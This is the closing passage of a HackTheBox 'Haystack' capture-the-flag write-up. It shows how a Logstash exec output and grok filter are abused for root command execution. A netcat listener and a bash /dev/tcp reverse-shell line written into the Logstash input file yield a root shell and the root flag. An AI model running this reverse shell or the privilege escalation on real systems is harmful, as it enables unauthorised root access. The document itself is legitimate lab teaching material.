<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#960050;background-color:#1e0010">x</span><span style="color:#960050;background-color:#1e0010">e</span><span style="color:#960050;background-color:#1e0010">c</span> {
    <span style="color:#960050;background-color:#1e0010">c</span><span style="color:#960050;background-color:#1e0010">o</span><span style="color:#960050;background-color:#1e0010">m</span><span style="color:#960050;background-color:#1e0010">m</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#960050;background-color:#1e0010">n</span><span style="color:#960050;background-color:#1e0010">d</span> <span style="color:#960050;background-color:#1e0010">=</span><span style="color:#960050;background-color:#1e0010">&gt;</span> <span style="color:#f92672">&#34;%{comando} &amp;&#34;</span>
}
</code></pre></div><p>Good, it seems we can write any command in a file named <code>/opt/kibana/logstash_*</code> and it should be run as root. Neat.
But first we have to make sure the command match the filter to be parsed correctly by logstash.</p>
<p>Let&rsquo;s understand that filter :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat filter.conf
filter <span style="color:#f92672">{</span>
	<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span>type<span style="color:#f92672">]</span> <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;execute&#34;</span> <span style="color:#f92672">{</span>
		grok <span style="color:#f92672">{</span>
			match <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;message&#34;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&#34;</span> <span style="color:#f92672">}</span>
		<span style="color:#f92672">}</span>
	<span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>
</code></pre></div><p>That&rsquo;s a complicated syntax at first look. Logstash documentation present <code>grok</code> as :</p>
<blockquote>
<p>Grok is a great way to parse unstructured log data into something structured and queryable.</p>
</blockquote>
<p>So it&rsquo;s a kind of regex. Let&rsquo;s understand it step by step :</p>
<p><code>Ejecutar\s*comando\s*:\s+</code> is a simple regex, meaning that the file have to begin with this sentence.
<code>%{GREEDYDATA:comando}</code> is the interresting grok part. According to the <a href="https://github.com/logstash-plugins/logstash-patterns-core/blob/master/patterns/grok-patterns">grok pattern source</a> <code>GREEDYDATA</code> correspond to a <code>.*</code> in regex.</p>
<p>So basically, when given the following line : <code>Ejecutar comando : id</code> grok will match the line and take the <code>id</code> part and parse it as <code>commando</code> variable to the Logstash output (<code>command =&gt; &quot;%{comando} &amp;&quot;</code> as seen in <code>output.conf</code>).</p>
<p>Let&rsquo;s put all those informations together and try to get a root shell.</p>
<p>First as usual let&rsquo;s open a <code>netcat</code> listener :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -l -vv -p <span style="color:#ae81ff">4485</span>
Listening on any address <span style="color:#ae81ff">4485</span> <span style="color:#f92672">(</span>assyst-dr<span style="color:#f92672">)</span>
</code></pre></div><p>Then create the file Logstash will take as input (<code>/opt/kibana/logstash_*</code>) with the correct content matching the <code>filter.conf</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.10.10/4485 0&gt;&amp;1&#34;</span> &gt; /opt/kibana/logstash_hg8
</code></pre></div><p>We then wait a bit and fairly quicky we get an incoming connection as root:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -l -vv -p <span style="color:#ae81ff">4485</span>
Listening on any address <span style="color:#ae81ff">4485</span> <span style="color:#f92672">(</span>assyst-dr<span style="color:#f92672">)</span>
Connection from 10.10.10.115:49446
bash: no hay control de trabajos en este shell
<span style="color:#f92672">[</span>root@haystack /<span style="color:#f92672">]</span><span style="color:#75715e"># cat /root/root.txt</span>
3f5f727xxxxxxxxxxxx9d92
<span style="color:#f92672">[</span>root@haystack /<span style="color:#f92672">]</span>#
</code></pre></div><p>As always do not hesitate to contact me for any questions or feedbacks ;)</p>
<p>See you next time !</p>
<p>-hg8</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h">Read other posts</span>
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="/posts/jarvis/">
                  <span class="button__icon">←</span>
                  <span class="button__text">Jarvis - HackTheBox</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="/posts/writeup/">
                  <span class="button__text">Writeup - HackTheBox</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    


    
      
        

      
    

    </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="footer__content">
        <span>© 2020</span>
        <span><a href="https://hg8.rocks" target="_blank" rel="noopener">hg8</a></span>
        <span><a class="social-icon" href="https://github.com/hg8" target="_blank" rel="noopener" title="Github">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 20" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg>
            </a></span>
      </div>
    
  </div>
</footer>



<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>

      
    </div>

    
  </body>
</html>
